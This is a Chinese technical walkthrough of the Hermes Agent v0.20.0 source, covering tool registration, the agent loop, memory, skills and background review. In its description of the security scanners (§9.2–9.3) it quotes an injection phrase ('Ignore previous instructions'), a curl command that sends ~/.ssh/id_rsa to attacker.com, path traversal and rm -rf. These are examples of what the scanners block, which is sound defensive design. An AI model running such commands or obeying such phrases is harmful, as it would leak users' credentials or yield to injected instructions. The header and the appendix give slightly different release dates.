# Hermes Agent 工作流程详解

> **本文基于 Hermes Agent v0.20.0**（2026.8.3 发布，源码 commit `88ab589f6`）
>
> 所有路径、行号、类名均在 `~/.hermes/hermes-agent/` 源码中核实；行号标注为「约 N 行」以容忍小幅漂移。

## 一、项目概述

Hermes Agent 是由 Nous Research 构建的自我改进型 AI 代理。核心定位：**同一个 agent 内核，跑在 CLI、消息网关（Telegram/Discord/Slack/Signal/WhatsApp/微信/飞书/QQ 等 20+ 平台）、TUI 和 Electron 桌面端**。

**主要特性**：
- **多模型支持**：OpenAI / Anthropic / OpenRouter (200+ 模型) / Google Gemini / xAI / Bedrock / 本地 vLLM / Ollama / LM Studio
- **5 种 API 模式**：`chat_completions` / `anthropic_messages` / `codex_responses` / `bedrock_converse` / `gemini_native`，按模型自动选择
- **自我改进**：每轮对话结束后 fork 一个后台 review agent，自动判断要不要把经验写进记忆或沉淀成技能
- **技能系统**：渐进披露 (progressive disclosure) 的 Markdown 提示词文档
- **委托子代理**：`delegate_task` 可以并行 spawn 多个隔离上下文的子 agent
- **Cron 定时任务**：内置调度器，周期执行 LLM 或脚本任务

**主要技术栈**：Python 3.11+，prompt_toolkit (CLI)，SQLite + FTS5 (会话存储与搜索)，OpenAI/Anthropic SDK。

**代码规模**（v0.20.0 实测）：

| 顶层模块 | 行数 | 职责 |
|---|---|---|
| `cli.py` | ~879k 字节 | CLI 入口、所有 `/` 命令、交互 UI |
| `run_agent.py` | 8383 行 | `AIAgent` 类外壳 + 大量 thin forwarder |
| `agent/` | 142 个模块 | 真正的 agent 逻辑（拆出来的） |
| `tools/` | 122 个文件 | 工具实现，96 处 `registry.register(...)` |
| `gateway/` | 58 个文件 + `platforms/` | 消息网关与各平台适配 |
| `cron/` | 15 个文件 | 定时任务调度 |

这是与 2026-04 版本最大的差异：**`run_agent.py` 从「~9000 行的上帝文件」收缩成 8383 行的壳**，绝大多数实现搬到 `agent/` 子模块。原文档引用的大量 `run_agent.py` 行号已失效，下面会逐一更新。

---

## 二、核心概念：工具 vs 技能

### 2.1 工具 (Tool)

| 属性 | 说明 |
|---|---|
| 本质 | 可执行的 Python 代码 |
| 作用 | 真正执行操作（搜索网络、读文件、执行命令等） |
| 位置 | `tools/*.py`（122 个文件） |
| 执行者 | Hermes Agent |
| 例子 | `web_search` 真正调用 Firecrawl / Exa / Tavily |

v0.20.0 实测有 **96 处 `registry.register(...)` 调用**（不含注释里的），覆盖 web、terminal、file、browser、vision、image_gen、video_gen、audio、code_execution、delegation、cronjob、memory、skills、todo、session_search、kanban、clarify、mcp、homeassistant、feishu、discord、computer_use、desktop_ui、project、x_search 等 30+ 个工具集（toolset）。

### 2.2 技能 (Skill)

| 属性 | 说明 |
|---|---|
| 本质 | Markdown 提示词文档（YAML frontmatter + 正文） |
| 作用 | 告诉大模型"什么场景用什么工具、怎么用" |
| 位置 | `~/.hermes/skills/<name>/SKILL.md` + 可选 `references/ scripts/ templates/` |
| 执行者 | 不执行任何操作，只编译进系统提示词 |
| 加载方式 | 渐进披露：默认只把 name+description 索引进系统提示词，模型主动调 `skill_view` 才加载全文 |

技能分三类来源：`skills/`（内置）、`~/.hermes/skills/`（用户自建）、`plugins/`（插件提供）。这三类都通过 `agent/prompt_builder.py:1713 build_skills_system_prompt()` 汇总成索引。

---

## 三、工具注册机制

### 3.1 自注册模式

```python
# tools/registry.py:414 ToolRegistry 单例
registry = ToolRegistry()

# tools/web_tools.py 模块加载时自注册
registry.register(
    name="web_search",
    toolset="web",
    schema={
        "name": "web_search",
        "description": "Search the web for information...",
        "parameters": {
            "type": "object",
            "properties": {"query": {"type": "string"}},
            "required": ["query"]
        }
    },
    handler=lambda args, **kw: web_search_tool(args.get("query", ""), limit=5),
    check_fn=check_web_api_key,   # 检查凭证是否就绪；不满足则不暴露给模型
)
```

### 3.2 注册流程

```
model_tools.py 顶部 from tools.registry import discover_builtin_tools
    ↓
discover_builtin_tools(tools_dir) 扫描 tools/*.py
    ↓
importlib.import_module() 触发各模块顶部的 register() 调用
    ↓
工具注册到全局 registry（RLock 保护的 _tools 字典）
    ↓
model_tools.get_tool_definitions(enabled_toolsets, disabled_toolsets)
    ↓  按 toolset 过滤 + check_fn 检查 + 缓存（基于 registry._generation 失效）
AIAgent 收到一份本 session 可用的工具 schema 列表
```

`ToolRegistry` 内部有两层锁：`threading.RLock` 保护 `_tools` 字典，以及一个 `_generation` 计数器，每次注册/反注册/别名变更就 +1。`get_tool_definitions` 会缓存结果，但缓存键带 generation，任何注册变更自动失效——这保证了 MCP 动态刷新、插件加载、子代理裁剪工具集时，下游看到的工具列表永远一致。

### 3.3 插件覆写内建工具的授权机制

`ToolRegistry._plugin_override_policy` 是一张持久表：插件加载时登记「允许哪些模块覆写内建工具」。当 `register()` 被调用时，注册器通过 `handler.__globals__["__name__"]` 找到 handler 定义的模块，再去 policy 表查授权。这是一个值得注意的设计：**授权绑定到代码定义处，而不是调用点**——一个插件没法通过把 register 调用包在 lambda 或线程回调里来偷渡覆写。

---

## 四、系统提示词组装

系统提示词的组装搬到 `agent/system_prompt.py`（814 行），分三段：

```python
# agent/system_prompt.py 头部注释
# Three tiers are joined with \n\n:
#   stable   — 身份 (SOUL.md 或 DEFAULT_AGENT_IDENTITY)、工具使用指南、
#              computer-use 指南、nous 订阅块、per-model 操作指南、
#              alibaba model-name workaround、环境提示、coding 指南、平台提示
#   context  — 调用方传入的 system_message + 在 TERMINAL_CWD 下发现的
#              AGENTS.md / .cursorrules 等上下文文件 + coding workspace 快照
#   volatile — 技能索引、memory 快照、USER.md 画像、外部 memory provider 块、
#              时间戳/session/model/provider 行
```

入口：

```python
# agent/system_prompt.py:265
def build_system_prompt_parts(agent, system_message=None) -> Dict[str, str]:
    ...   # 三段独立返回，方便单独看哪段变了

# agent/system_prompt.py:689
def build_system_prompt(agent, system_message=None) -> str:
    ...   # 三段 join
```

`run_agent.py:4560` 现在只剩一个 thin forwarder：

```python
def _build_system_prompt_parts(self, system_message=None):
    from agent.system_prompt import build_system_prompt_parts
    return build_system_prompt_parts(self, system_message)
```

**关键不变量（来自 `AGENTS.md`）**：每个对话的系统提示词在会话存活期间**字节稳定**——只有这样，长对话反复调用 API 时前缀缓存才能命中。这解释了为什么 memory 写入用「冻结快照」而不是即时重读，也是为什么 `agent/prompt_cache_boundary.py` 专门管这件事。

---

## 五、完整工作流程：以「查询谷歌股价」为例

### 5.1 初始化阶段

Agent 启动时（`agent/agent_init.py`）：

1. **API 模式选择**（约 638 行起）：根据 model 字符串和凭证自动决定 `api_mode`——`"codex_responses"` / `"anthropic_messages"` / `"bedrock_converse"` / `nous_api_mode(model)` / 兜底 `"chat_completions"`
2. **工具注册**：`discover_builtin_tools()` 扫描 `tools/*.py`，模块加载触发 `register()`
3. **系统提示词组装**：`build_system_prompt()` 三段拼接（见 §4）
4. **记忆加载**：`MemoryStore.load_from_disk()` 读 `MEMORY.md` / `USER.md`，构建冻结快照（见 §9.2）

### 5.2 用户输入与消息组装

真正的对话循环在 `agent/conversation_loop.py:1428 run_conversation(agent, user_message, ...)`（7763 行的模块——这是从 `run_agent.py` 拆出来的最大一块，约 3900 行函数体）。

```
messages = [
    {"role": "system", "content": "<stable + context + volatile 三段>"},
    {"role": "user",   "content": "帮我查询谷歌股价"},
]
```

### 5.3 API 请求

`api_kwargs` 大致长这样（字段名按 api_mode 略有差异）：

```python
api_kwargs = {
    "model": "claude-opus-4-6",
    "messages": [
        {"role": "system", "content": "You are Hermes...\n\n## Available Skills\n..."},
        {"role": "user",   "content": "帮我查询谷歌股价"},
    ],
    "tools": [  # get_tool_definitions() 输出，按 enabled_toolsets 过滤
        {"type": "function", "function": {"name": "web_search", ...}},
        # ... 其他工具 schema
    ],
    "tool_choice": "auto",
    "max_tokens": 8192,
}
```

Anthropic 模式下还会注入 `cache_control`（见 §11.3）。

### 5.4 大模型决策

大模型看到 `tools` 参数中的 schema，返回：

```json
{
    "choices": [{
        "finish_reason": "tool_calls",
        "message": {
            "role": "assistant",
            "tool_calls": [{
                "id": "call_abc123",
                "type": "function",
                "function": {
                    "name": "web_search",
                    "arguments": "{\"query\": \"GOOGL stock price today 2026\"}"
                }
            }]
        }
    }]
}
```

### 5.5 Agent 执行工具

```python
# model_tools.py:1160 handle_function_call()
def handle_function_call(function_name, function_args, task_id=None, ...):
    # 1. 类型强转："42" → 42（按 schema 声明）
    function_args = coerce_tool_args(function_name, function_args)

    # 2. Tool Search 桥（v0.20 新增，详见 §11.5）
    #    tool_search / tool_describe / tool_call 走单独通道
    if _ts_mod.is_bridge_tool(function_name):
        ...

    # 3. pre_tool_call 插件钩子（可拦截）
    # 4. 分发到注册表
    result = registry.dispatch(function_name, function_args, ...)
```

`tools/registry.py:801 dispatch()`：

```python
def dispatch(self, name, args, **kwargs):
    entry = self.get_entry(name)
    if not entry:
        return tool_error(f"Unknown tool: {name}")
    try:
        if entry.is_async:
            result = _run_async(entry.handler(args, **kwargs))
        else:
            result = entry.handler(args, **kwargs)
        return self._normalize_handler_result(name, result)
    except Exception as e:
        # 异常也被包成 {"error": ...} 返回给模型，不抛出
        return tool_error(_sanitize_tool_error(...))
```

**统一错误契约**：所有工具异常都被捕获并包成 `{"error": "..."}` 字符串返回，模型看到的是结构化错误而不是 traceback，这也让 `finish_reason="tool_calls"` 的循环能继续走。

### 5.6 第二轮 API 调用

```python
messages.append({"role": "assistant", "content": None, "tool_calls": [...]})
messages.append({"role": "tool", "content": result, "tool_call_id": "call_abc123"})
```

大模型看到结果后组织自然语言回答，`finish_reason="stop"`，循环退出。

---

## 六、循环机制详解

### 6.1 主循环源码

```python
# agent/conversation_loop.py:1640
while (api_call_count < agent.max_iterations
       and agent.iteration_budget.remaining > 0) \
      or agent._budget_grace_call:
    # 1. 处理 pending redirect（用户在工具执行中追加指令）
    _redirect_text = agent._drain_pending_redirect()
    if _redirect_text: ...

    # 2. checkpoint 去重
    agent._checkpoint_mgr.new_turn()

    # 3. 中断检查
    if agent._interrupt_requested: break

    # 4. 迭代预算扣减
    api_call_count += 1
    if agent._budget_grace_call:
        agent._budget_grace_call = False
    elif not agent.iteration_budget.consume():
        break   # 预算耗尽

    # 5. 调 API → 处理 finish_reason → 工具执行 → 追加 messages
    ...
```

注意循环条件是**双条件**（api_call_count 上限 + iteration_budget 剩余），且多了一个 `_budget_grace_call`：预算耗尽时给模型最后一次机会不带工具做总结。

### 6.2 IterationBudget（独立模块）

前版说在 `run_agent.py:170-211`；v0.20 搬到 `agent/iteration_budget.py`（完整独立文件，约 80 行）：

```python
class IterationBudget:
    """线程安全迭代计数器。
    每个 agent (parent 或 subagent) 有独立 budget。
    Parent 上限 = max_iterations (默认 500)；
    Subagent 上限 = delegation.max_iterations (默认 50)。
    execute_code 工具的迭代通过 refund() 退回。
    """

    def __init__(self, max_total: int):
        self.max_total = max_total
        self._used = 0
        self._lock = threading.Lock()

    def consume(self) -> bool: ...   # 拿一个；拿不到返回 False
    def refund(self) -> None: ...    # 退回（execute_code 用）
    @property
    def remaining(self) -> int: ...
```

**关键设计**：父子 budget 独立，所以 parent + N 个 subagent 的总迭代数可以超过 parent 的上限。`execute_code`（让模型在沙箱里写 Python 来调用多个工具）产生的内部迭代通过 `refund()` 退回，不消耗用户预算。

### 6.3 并行工具执行

`agent/tool_executor.py:240` 处理工具批次的执行计划。模型一次返回多个 `tool_calls` 时，执行器先调 `_plan_tool_batch_segments()` 把批次切成**并行安全段 + 串行段**：

- **并行段**：相互独立的只读工具（如两个 `web_search`），用 `ThreadPoolExecutor` 跑，最多 `_MAX_TOOL_WORKERS = 8` 个 worker（`agent/tool_executor.py:93`）
- **串行段**：有依赖或写操作（`patch` / `write_file` / `terminal` 写命令），按顺序执行

并行上限对图像生成有单独的 `_image_generate_parallel_limit()`（约 209 行），因为 image_gen 通常对并发请求有配额限制。

### 6.4 迭代耗尽时的特殊处理

前版引用的 `run_agent.py:8526` 已搬迁；现在 `run_agent.py:7941 _handle_max_iterations()` 只是 forwarder，实际在 `agent/chat_completion_helpers.py:2312 handle_max_iterations()`：

```python
def handle_max_iterations(agent, messages, api_call_count):
    agent._safe_print("⚠️  Reached maximum iterations ...")
    # 注入一个特殊的 user message（MAX_ITERATIONS_SUMMARY_REQUEST）
    messages.append({"role": "user", "content": MAX_ITERATIONS_SUMMARY_REQUEST})
    # 然后走一次正常的 API 调用（不再允许工具调用）
    ...
```

这个特殊 user message 的字符串在 `agent/context_compressor.py` 中定义为常量 `MAX_ITERATIONS_SUMMARY_REQUEST`——它会被 SessionDB 的投影层识别为「合成压缩提示」，避免被当成真实用户消息渲染。这是 v0.20 才有的细节。

### 6.5 中断与重定向

循环顶部每轮都会检查 `_interrupt_requested`（用户敲了 /stop 或发了新消息）和 `_drain_pending_redirect()`（`/steer` 命令注入）。后者让用户在 Agent 执行工具的间隙追加修正指令，下一轮 API 调用就能看见。这是消息网关场景的关键能力。

---

## 七、大模型与 Agent 的关系

```
┌──────────────────────────────────────────────────────┐
│              Hermes Agent (Python 进程)              │
│                                                      │
│   工具的真正主人：                                    │
│   - 96 个 registry.register 调用                      │
│   - 122 个 tools/*.py 文件                            │
│   - 30+ 个工具集（toolset）                           │
│   - 负责实际执行                                      │
│                                                      │
│   角色：执行者（将军）                                │
└────────────────────┬─────────────────────────────────┘
                     │
   "我有这些工具，     "执行结果给你，
    你来决定该用哪个"   继续处理"
                     ↕
┌──────────────────────────────────────────────────────┐
│                     大模型                            │
│                                                      │
│   通过 tools 参数看到：                               │
│   - 工具有哪些（按 enabled_toolsets 过滤后）          │
│   - 每个工具怎么用（JSON schema 描述）                │
│   - 参数格式是什么                                    │
│                                                      │
│   角色：决策者（军师）                                │
└──────────────────────────────────────────────────────┘
```

### 关键理解

1. **工具定义（schema）是通过 API 调用时传给大模型的**，不是大模型预先知道的
2. **大模型只做决策**，不执行任何操作
3. **Agent 是真正的执行者**，接收大模型的调用请求并执行代码
4. **技能是提示词辅助**，告诉大模型"什么场景用什么工具"
5. **check_fn 决定工具是否暴露**：凭证不全的工具甚至不会进 `tools` 参数，模型根本不知道它存在

---

## 八、API 模式差异

前版的表格仍然准确，但 v0.20 多了一个 api_mode：

| api_mode | 触发场景 | 停止字段 | 工具调用字段 |
|---|---|---|---|
| `chat_completions` | OpenAI 兼容（默认） | `finish_reason` | `tool_calls` |
| `anthropic_messages` | Anthropic Claude | `stop_reason` | `content[].type == "tool_use"` |
| `codex_responses` | OpenAI Codex / o-系列 | `status` | `output[].type == "function_call"` |
| `bedrock_converse` | AWS Bedrock | `stopReason` | `toolUse` |
| `gemini_native` | Google Gemini 原生 SDK | `finish_reason` | `function_call` |

`agent/agent_init.py` 在初始化时根据模型字符串和凭证自动选定一个。

**核心抽象依然不存在**：每种 api_mode 在 `run_agent.py` 和 `agent/` 里有自己的 `if/elif` 分支（v0.20 实测在 `run_agent.py` 中出现 29 次 `api_mode ==`），加上专属 transport / adapter 模块：

- `agent/anthropic_adapter.py`
- `agent/bedrock_adapter.py`
- `agent/codex_responses_adapter.py` / `agent/codex_runtime.py`
- `agent/gemini_native_adapter.py` / `agent/gemini_schema.py`
- `agent/azure_identity_adapter.py`
- `agent/vertex_adapter.py`

这种「不显式抽象、按 api_mode 分支」是有意的：每种 API 的差异不只是字段名，还有流式协议、缓存控制、工具 schema 语法（如 Anthropic 用 `input_schema`，OpenAI 用 `parameters`），硬抽一个统一接口反而会把差异压进 adapter 内部造成更深的复杂度。

---

## 九、自学习机制详解

这是 Hermes 区别于一般 agent 框架的核心特性，分三层：**记忆系统 + 技能系统 + 后台 review 循环**。

### 9.1 三套机制的区别

| | 记忆 (Memory) | 技能 (Skill) | 后台 review |
|---|---|---|---|
| 本质 | 键值对事实快照 | 可复用任务流程 | 每轮结束后的自评循环 |
| 内容 | 用户偏好、环境事实 | 如何完成某类任务的 SOP | 判断"本轮值得存什么" |
| 写入者 | 模型主动调 `memory` 工具 | 模型主动调 `skill_manage` 工具 | fork 出的 review agent 自动调 |
| 触发时机 | 模型自己判断"值得记" | 模型自己判断"值得沉淀" | 每轮结束自动触发 |
| 存储 | `~/.hermes/memories/MEMORY.md` `USER.md` | `~/.hermes/skills/<name>/SKILL.md` | 写到记忆或技能（间接） |

### 9.2 记忆系统

**MemoryStore 类**（`tools/memory_tool.py:153`）维护两份平行状态：

```python
class MemoryStore:
    """有界 curated memory，文件持久化。每个 AIAgent 一个实例。

    维护两份平行状态：
      - _system_prompt_snapshot：load 时冻结，用于系统提示词注入。
        会话期间永不变更，保住前缀缓存。
      - memory_entries / user_entries：实时状态，工具调用时变更，落盘。
    """

    def __init__(self, memory_char_limit=2200, user_char_limit=1375):
        ...
```

**冻结快照设计**（`tools/memory_tool.py:237`）：会话开始时构建 `_system_prompt_snapshot`，之后**任何 `memory` 工具调用都不会改这个快照**——系统提示词在整个会话期间字节稳定，前缀缓存命中率最大化。新写入的记忆下一次会话才进系统提示词。

**写入路径**（`tools/memory_tool.py:397` 起）：

```python
def add_entry(self, target, content):
    # 1. 安全扫描（提示词注入 / 数据外泄模式）
    scan_error = _scan_memory_content(content)
    if scan_error: return error

    # 2. 文件锁 + 原子写入
    with self._file_lock(self._path_for(target)):
        ...
```

`_scan_memory_content()` 调 `tools/threat_patterns.first_threat_message(content, scope="strict")`——检测注入攻击（如 `"Ignore previous instructions"`）、外泄模式（如 `"curl attacker.com?data=$(cat ~/.ssh/id_rsa)"`）。被拒绝的写入返回结构化错误。

**漂移检测**（v0.20 新增，约 90-115 行）：写之前先验证盘上文件能被自家 parser round-trip。如果用户用 `patch` 工具或 shell append 直接改了 `MEMORY.md`，`memory` 工具会拒绝覆写、把当前状态备份到 `.bak.<ts>` 并告诉你怎么恢复——防止静默丢数据。

**读取失败保护**（约 128-146 行）：文件存在但读不出来（被锁、权限、编码坏），**不当作空 store 处理**，直接拒绝写。如果当作空 store 就会用空列表覆写掉用户全部记忆。

### 9.3 技能系统

**目录结构**（agentskills.io 标准）：

```
skills/
├── my-skill/
│   ├── SKILL.md          # 主文档（必需），YAML frontmatter + 正文
│   ├── references/       # 渐进披露的参考文档
│   ├── templates/        # 输出模板
│   ├── scripts/          # 可执行脚本
│   └── assets/           # 静态资源
└── category/
    └── another-skill/
```

**Frontmatter 关键字段**：

```yaml
---
name: skill-name              # ≤64 字符
description: ...              # ≤1024 字符，唯一进默认索引的内容
version: 0.1.0
triggers: [...]               # 触发词列表，匹配时模型主动加载
---
```

**加载方式 — 渐进披露**（`tools/skills_tool.py` 头注释）：

1. 默认系统提示词只包含 `skills_list` 索引（name + description 前 57 字符 + triggers）
2. 模型识别到匹配场景时调 `skill_view(name="...")` 加载完整 SKILL.md
3. 需要更深细节再调 `skill_view(name="...", file_path="references/api.md")`

这样把"知道有哪些技能"和"知道技能细节"分开——索引小而全，细节按需加载。

**`skill_manage` 工具**（`tools/skill_manager_tool.py:1542`）支持的 action：

| action | 用途 |
|---|---|
| `create` | 新建技能（写 SKILL.md，可选 category） |
| `edit` | 全量替换 SKILL.md |
| `patch` | 模糊匹配定位替换（用 `tools/fuzzy_match.fuzzy_find_and_replace`） |
| `delete` | 删除技能 |
| `write_file` / `remove_file` | 管理 `references/ scripts/ templates/ assets/` 下的支持文件 |

**安全扫描**（`tools/skill_manager_tool.py:125 _security_scan_skill`）：

```python
def _security_scan_skill(skill_dir: Path) -> Optional[str]:
    # 调 tools/skills_guard.py:640 scan_skill() 和 787 should_allow_install()
    # 检测：
    #   - 路径穿越 (../../../etc/passwd)
    #   - 恶意 shell 命令（rm -rf、curl 外传、读敏感文件）
    #   - 提示词注入
    # 不通过则拒绝创建/编辑，回滚
```

`create` / `edit` / `patch` / `write_file` 在真正落盘前都会先跑 `_security_scan_skill()`（在 945 / 1038 / 1167 / 1346 行各调用一次）。

### 9.4 后台 review 循环（v0.20 的重要新增）

前版完全没提到这个机制。`agent/background_review.py` 头注释：

> 每轮对话结束后，`AIAgent.run_conversation` 可能调 `spawn_background_review` 起一个守护线程，把对话快照重放到一个 fork 的 `AIAgent` 里，问它"有值得存的技能或记忆吗？"。写入直达 memory + skill store。主对话与前缀缓存完全不动。

关键设计：

- **fork 复用 parent 的 runtime**：provider / model / base_url / 凭证 / 缓存的系统提示词，所以前缀缓存还能命中
- **工具白名单**：fork 出的 review agent 只能用 `memory` 和 `skill_manage`，其他工具一律拒绝
- **独立 IterationBudget**：不消耗 parent 的迭代预算
- **触发条件**：由 `agent._should_review_memory` 判断，不是每轮都跑（琐碎对话跳过）

这意味着即使用户没在对话里明确要求"记下来"，Hermes 也会在后台持续把对话里有价值的经验固化成记忆和技能——这是"自学习"最完整的体现。

### 9.5 自学习完整流程示例

```
用户：帮我部署 FastAPI 到服务器

┌──────────────────────────────────────────────┐
│ 主对话：模型决策 + 工具执行                    │
│ - terminal: docker build, push                │
│ - terminal: ssh deploy                        │
└────────────┬─────────────────────────────────┘
             │ 任务完成，回复用户
             ↓
┌──────────────────────────────────────────────┐
│ 后台 review fork（用户看不到）                 │
│ - 重放对话快照                                │
│ - review agent 自问：值得存吗？                │
│ - 决定 → 调 skill_manage(create)              │
│   ~/.hermes/skills/fastapi-deploy/SKILL.md    │
│ - 也可能调 memory(target="user", ...)         │
│   记用户部署偏好                              │
└────────────┬─────────────────────────────────┘
             ↓
下次会话
用户：再帮我部署一次
→ 系统提示词包含 fastapi-deploy 技能索引
→ 模型 skill_view 加载 → 按 SOP 执行
```

---

## 十、运行时支持系统

前版没覆盖到但值得知道的几个机制。

### 10.1 上下文压缩（ContextCompressor）

`agent/context_compressor.py:1577 ContextCompressor`：长对话快撑爆上下文窗口时自动触发。

策略（文件头注释）：
- **保护头尾**：system + 第一条 user + 最近 N 条消息不动
- **压缩中段**：用便宜快速的辅助模型对中段做摘要
- **结构化摘要模板**：已解决 / 待办两栏跟踪
- **迭代式更新**：多次压缩时保留之前的摘要信息
- **工具输出剪枝**：先做一次便宜的预剪枝再喂给摘要模型

注意区分：`trajectory_compressor.py` 是离线工具，用于把已完成的 trajectory 压到训练预算内，不是运行时机制。

### 10.2 委托子代理（delegate_task）

`tools/delegate_tool.py`：spawn 一个隔离上下文的子 agent。

- 子 agent 拿全新对话（不继承 parent 历史）
- 独立 `task_id`（独立 terminal session、独立文件缓存）
- 继承 parent 的 toolset，剥掉子代理禁用的工具（`delegate_task` / `memory` / `cronjob` 等）
- 父对话只看到 delegation 调用和最终 summary，**看不到子 agent 的中间工具调用**

子 agent 上限 `delegation.max_iterations`（默认 50），parent 默认 500。

### 10.3 Cron 调度器

`cron/scheduler.py`：内置 cron，60 秒 tick 一次。支持：
- LLM 驱动的 job（每次跑一个 agent 会话）
- 纯脚本 job（`no_agent=True`，零 token）
- 跨会话持续（deliver 到 origin / 指定平台）
- 链式触发（`context_from` 把上游 job 的输出注入下游 prompt）

文件锁 `~/.hermes/cron/.tick.lock` 保证多进程只有一个 tick 在跑。

### 10.4 消息网关

`gateway/run.py` + `gateway/platforms/`：把同一个 agent 内核接到 20+ 消息平台。每个平台是一个 adapter（webhook / polling / websocket），把消息规范化成 `user_message` 喂给 `run_conversation`，再把 agent 输出按平台能力渲染（Markdown / 分段 / 语音 / 反应 emoji）。

平台列表（`gateway/platforms/`）实测：Signal、WhatsApp (cloud + 自有协议)、微信、企业微信、QQ Bot、飞书、BlueBubbles (iMessage)、MS Graph (Outlook webhooks)、通用 webhook 等。加上 `gateway/platforms/` 之外的 Telegram / Discord / Slack 等内置在主 `gateway/` 里的适配，总数 20+。

### 10.5 模型路由与错误分类

`agent/error_classifier.py:24 FailoverReason`：把 API 错误分类成 ~15 种（auth / auth_permanent / rate_limit / content_policy_blocked / long_context_tier / oauth_long_context_beta_forbidden / thinking_signature / llama_cpp_grammar_pattern 等），每种对应不同的 failover 策略——是切下一个 fallback 模型、还是重试、还是终止。

`hermes_cli/model_normalize.py` 处理模型名规范化（`claude-sonnet-4.6` → `anthropic/claude-sonnet-4.6` 用于 OpenRouter），影响路由与提供商匹配。

---

## 十一、其他重要实现细节

### 11.1 工具并发执行

前版引用 `run_agent.py:239 _MAX_TOOL_WORKERS = 8`；v0.20 实测在 `run_agent.py:265` 和 `agent/tool_executor.py:93` 各一份（后者是真值，前者是 re-export）。详见 §6.3。

### 11.2 插件钩子（pre_tool_call / post_tool_call）

`model_tools.py` 在工具执行前后留了插件钩子。前置钩子返回错误可以拦截执行；后置钩子拿到 `(function_name, function_args, result, task_id, session_id, tool_call_id, turn_id, api_request_id, duration_ms, middleware_trace)` 完整上下文，可以做审计日志、结果修改、二次确认等。

### 11.3 Anthropic Prompt Caching

`run_agent.py:7171-7206`：当 provider 是 Anthropic 时，在系统消息最后一块注入 `cache_control: {"type": "ephemeral"}`，让 Claude 把系统提示词前缀缓存住，后续 turn 不重复计费。配合「系统提示词字节稳定」的不变量（§4），命中率最大化。

### 11.4 Codex Responses API

`agent/codex_responses_adapter.py` + `agent/codex_runtime.py`：OpenAI Codex / o-系列用 Responses API，不是 Chat Completions。流式协议、工具调用结构、状态机都不一样，单独一套 adapter。

### 11.5 Tool Search 桥（v0.20 新增）

`tools/tool_search.py`：当启用的工具太多导致 `tools` 参数超 token 预算时，模型只看到 `tool_search` / `tool_describe` / `tool_call` 三个桥工具，按需要时再搜出真正的工具调用。`handle_function_call` 在分发前会检查 `is_bridge_tool()`，把 `tool_call` 解包成对底层真实工具的调用——下游所有 hook / approval / guardrail 看到的都是真实工具名，不是桥名。

### 11.6 技能使用 nudge

`agent/conversation_loop.py:1707`：模型连续多轮调用工具但没用 `skill_manage` 时，会触发一个软性提示「是不是该沉淀一下技能？」。`_skill_nudge_interval` 控制频率。

---

## 十二、总结

**Hermes Agent 的本质是一个"大模型 + 工具执行框架 + 自学习闭环"的协作系统**：

1. **工具系统**：96 个工具横跨 30+ 工具集，通过 schema 描述注册，按 `enabled_toolsets` 过滤暴露给模型
2. **技能系统**：渐进披露的 Markdown 提示词，索引进系统提示词，细节按需加载
3. **循环机制**：大模型决策 → Agent 执行（可并行）→ 结果反馈 → 直到完成，预算用 `IterationBudget` 线程安全计数
4. **API 多模式**：5 种 api_mode 分别处理，不强行抽象
5. **自学习闭环**：记忆 (memory) + 技能 (skill_manage) + 后台 review fork，三层互补
6. **角色分工**：大模型是"军师"出主意，Agent 是"将军"执行

**核心流程**：

```
系统提示词（stable + context + volatile 三段，会话期间字节稳定）
   +
工具 schema（按 toolset 过滤、check_fn 检查）
   ↓
大模型决策 → finish_reason="tool_calls"
   ↓
handle_function_call → registry.dispatch → 工具 handler
   ↓ (结果按 tool_call_id 关联追加进 messages)
循环（直到 finish_reason="stop" / 预算耗尽 / 中断）
   ↓
返回最终回答 + 后台 review fork 自评
```

**v0.20.0 vs 2026-04 版的差异一句话总结**：实现位置变了（`run_agent.py` 拆到 `agent/`），核心抽象没变（工具注册表 + 对话循环 + 自学习），新增的关键机制是**后台 review fork** 和 **Tool Search 桥**——前者让自学习从「模型主动调工具」升级成「每轮自动反思」，后者让 Hermes 能承载远超 token 预算的工具集。

---

## 附录：源码文件索引

> 所有路径相对 `~/.hermes/hermes-agent/`。行号为 v0.20.0 (2026-08-12, commit 88ab589f6) 实测。

### Agent 核心
| 文件 | 职责 |
|---|---|
| `run_agent.py` | `AIAgent` 类外壳（8383 行，大量 forwarder） |
| `agent/conversation_loop.py` | 对话循环主体（7763 行） |
| `agent/agent_init.py` | 初始化、api_mode 选择 |
| `agent/system_prompt.py` | 系统提示词三段组装（814 行） |
| `agent/iteration_budget.py` | 迭代预算（80 行） |
| `agent/tool_executor.py` | 工具执行、并行规划 |
| `agent/chat_completion_helpers.py` | 迭代耗尽总结等辅助 |
| `agent/background_review.py` | 后台 review fork |
| `agent/context_compressor.py` | 上下文压缩 |

### 工具系统
| 文件 | 职责 |
|---|---|
| `tools/registry.py` | ToolRegistry（1001 行），dispatch 在 801 行 |
| `tools/memory_tool.py` | MemoryStore，冻结快照 + 漂移保护 |
| `tools/skill_manager_tool.py` | skill_manage 入口（1542 行） |
| `tools/skills_guard.py` | 技能安全扫描 |
| `tools/delegate_tool.py` | 子代理 spawn |
| `tools/tool_search.py` | Tool Search 桥 |
| `model_tools.py` | 工具层入口（1160 行 handle_function_call） |

### 平台与调度
| 文件 | 职责 |
|---|---|
| `gateway/run.py` | 网关入口 |
| `gateway/platforms/` | 20+ 平台适配 |
| `cron/scheduler.py` | Cron 调度（60s tick） |
| `agent/error_classifier.py` | API 错误分类与 failover |
